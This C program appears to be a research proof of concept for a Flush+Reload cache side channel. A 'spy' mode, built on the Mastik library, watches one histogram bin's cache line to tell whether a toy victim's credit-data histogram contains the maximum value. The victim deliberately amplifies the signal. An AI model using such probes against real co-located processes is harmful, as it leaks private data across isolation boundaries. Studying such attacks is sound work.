#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <pthread.h>
#include <time.h>
#include <string.h>

#include "mastik/fr.h"
#include "mastik/util.h"
#include "mastik/low.h"

#include "german_credit.c"

#define BINSIZE 150

#define NUMBINS 130


#if (NUMBINS-1) < CREDIT_MAX_VAL/BINSIZE
#error "need more bins" 
#endif

int bins[NUMBINS] = {0};

// a delay used in the query loop to allow the spy to interleave
const struct timespec qdelay =  {.tv_sec = 0, .tv_nsec = 500000};
// a delay used in the spy loop to have it run at a similar rate
// to the victim but ensure it can (hopefully) reliably measure
const struct timespec sdelay = {.tv_sec = 0, .tv_nsec = 400000};

#define TRIALS 5

// bins[i] is for values in range i*binsize .. (i+1)*binsize-1
// preconditions:
//  binsize > 0, data is all non-negative,
//  bins is a zero-filled array with length at leas (max / binsize)
//   where 'max' is the maximum value in data
void gen_histogram(int *bins, int binsize, int *data, size_t len){
  for (int t=0; t<TRIALS; t++){
    int maxbin = -1;
    //printf("%d\n",t);
    //printf("Histogram on %d values\n",len);
    for (size_t i=0; i<len; i++){
      //printf("%d ",i); fflush(stdout);
      int bin = data[i] / binsize;
      if (bin > maxbin) {
        maxbin = bin;
      }
      if (data[i] == CREDIT_MAX_VAL) {
        printf("Hitting it\n");
        for (i=0; i<1000000; i++){
          bins[bin] = i;
          nanosleep(&qdelay,NULL);
        }
        printf("Done hitting\n");        
      }
      bins[bin]++;
      nanosleep(&qdelay,NULL);
    }
    //printf("maxbin: %d\n",maxbin);
  }
}

typedef enum {
  QUERY_ABSENT,
  QUERY_PRESENT,
  SPY
} main_mode_t;

int main(const int argc, const char *argv[]){
  main_mode_t mode;
  if (argc != 2){
    printf("usage: %s (query-absent|query-present|spy)\n",argv[0]);
    exit(1);
  }
  if (strcmp(argv[1],"query-absent") == 0){
    mode = QUERY_ABSENT;
  } else if (strcmp(argv[1],"query-present") == 0){
    mode = QUERY_PRESENT;
  } else if (strcmp(argv[1],"spy") == 0){
    mode = SPY;
  } else {
    printf("usage: %s (query-absent|query-present|spy)\n",argv[0]);
    exit(1);
  }

  switch (mode) {
  case QUERY_PRESENT:
    gen_histogram(bins, BINSIZE, credit_orig, CREDIT_ORIG_LEN);
    break;
  case QUERY_ABSENT:
    gen_histogram(bins, BINSIZE, credit_upd, CREDIT_UPD_LEN);
    break;
  case SPY:
    printf("Spying...\n");
    void *ptr = &(bins[CREDIT_MAX_VAL/BINSIZE]);
    fr_t fr = fr_prepare();
    fr_monitor(fr, ptr);

    uint16_t res[1];
    fr_probe(fr, res);

    int lines=0;

    while (1) {
      fr_probe(fr, res);
      if (res[0] < 140)
        printf("%4d: %s", ++lines, "max val touched\n");
      //delayloop(10000); // don't seem to detect anything when 1000
      nanosleep(&sdelay,NULL);      
    }
  }
  return 0;

}
